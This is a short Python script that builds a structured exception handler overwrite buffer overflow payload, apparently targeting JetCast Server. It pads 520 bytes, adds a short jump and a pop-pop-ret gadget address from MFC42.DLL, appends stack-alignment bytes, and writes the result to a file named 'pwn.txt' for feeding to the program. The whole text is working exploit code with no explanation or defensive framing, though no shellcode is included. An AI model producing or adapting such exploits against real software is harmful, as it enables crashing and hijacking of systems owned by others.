#!/usr/bin/python

alignESP = "\x54\x58\x66\x05\x77\x17\x50\x5C"

nSeh = "\x74\x06\x75\x04" # JZ - 74 JNZ - 75
Seh  = "\x52\x21\x45\x5f" # 0x5f452152 : pop ebx # pop ebp # ret 0x10  - C:\Program Files\JetCast Server\MFC42.DLL

payload  = "A" * 520
payload += nSeh
payload += Seh
payload += alignESP
payload += "A" * (5000 - len(payload))

f = open('pwn.txt', 'w')
f.write(payload)
f.close()

